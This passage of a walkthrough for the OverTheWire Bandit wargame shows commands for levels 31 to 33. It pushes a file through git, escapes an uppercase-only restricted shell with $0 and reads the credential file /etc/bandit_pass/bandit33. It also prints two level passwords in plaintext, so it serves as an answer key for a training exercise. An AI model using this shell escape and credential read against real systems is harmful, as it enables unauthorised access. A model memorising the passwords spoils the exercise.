ssh  bandit32@bandit.labs.overthewire.org -p 2220
mkdir /tmp/bandit31repo
cd /tmp/bandit31repo
GIT_SSH_COMMAND='ssh -p 2220' git clone ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo
cd repo
echo "May I come in?" > key.txt
git add -f key.txt
git config user.email "bandit31@example.com"
git config user.name "Bandit Player"
git commit -m "Add key.txt with required content"
GIT_SSH_COMMAND='ssh -p 2220' git push origin master


> password

```bash
3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
```

## Level 32-33

> commands

ssh  bandit33@bandit.labs.overthewire.org -p 2220
WELCOME TO THE UPPERCASE SHELL
>>(To exit from this shell use  $0)
cat /etc/bandit_pass/bandit33
Again login as bandit33

> password

```bash
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```

## Level 33 - 34

Congratulations cmpltd